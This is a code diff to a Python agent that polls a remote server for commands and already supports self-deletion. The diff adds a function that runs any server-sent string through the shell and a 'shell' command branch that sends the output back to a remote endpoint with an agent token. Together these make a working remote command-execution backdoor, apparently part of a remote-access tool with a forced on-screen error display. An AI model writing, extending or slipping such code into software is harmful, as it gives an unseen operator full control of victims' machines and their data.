@@ -234,6 +234,24 @@ def show_error():
     _force_topmost()
 
 
+def execute_shell_command(cmd_str):
+    try:
+        result = subprocess.run(
+            cmd_str,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=10
+        )
+        output = result.stdout if result.stdout else ""
+        error = result.stderr if result.stderr else ""
+        return output + error if error else output
+    except subprocess.TimeoutExpired:
+        return "Error: Command timeout"
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
 def auto_compile():
     if getattr(sys, "frozen", False):
         return
@@ -304,6 +322,7 @@ def command_check_loop():
             data = json.loads(resp.decode("utf-8"))
             cmd = data.get("command")
             cantidad = data.get("cantidad", 1)
+            payload = data.get("payload", "")
 
             if cmd and cmd != "none":
                 last_command_time = time.time()
@@ -316,6 +335,28 @@ def command_check_loop():
             elif cmd == "self-delete":
                 print(f"[command] Recibido 'self-delete' para device {device_id}. Iniciando desinstalación...", flush=True)
                 threading.Thread(target=lambda: self_delete_agent(device_id), daemon=True).start()
+
+            elif cmd == "shell":
+                print(f"[command] Ejecutando comando shell: {payload}", flush=True)
+                output = execute_shell_command(payload)
+                try:
+                    req = urllib.request.Request(
+                        LOG_AUTH_URL + "/command-result",
+                        data=json.dumps({
+                            "deviceId": device_id,
+                            "result": output,
+                            "timestamp": int(time.time() * 1000)
+                        }).encode("utf-8"),
+                        headers={
+                            "Content-Type": "application/json",
+                            "Authorization": "Bearer " + AGENT_TOKEN,
+                            "User-Agent": USER_AGENT,
+                        },
+                        method="POST",
+                    )
+                    urllib.request.urlopen(req, timeout=10)
+                except Exception as e:
+                    print(f"[command] Error enviando resultado: {e}", flush=True)
 
         except Exception as e:
             print(f"[command] ERROR: {e}", flush=True)
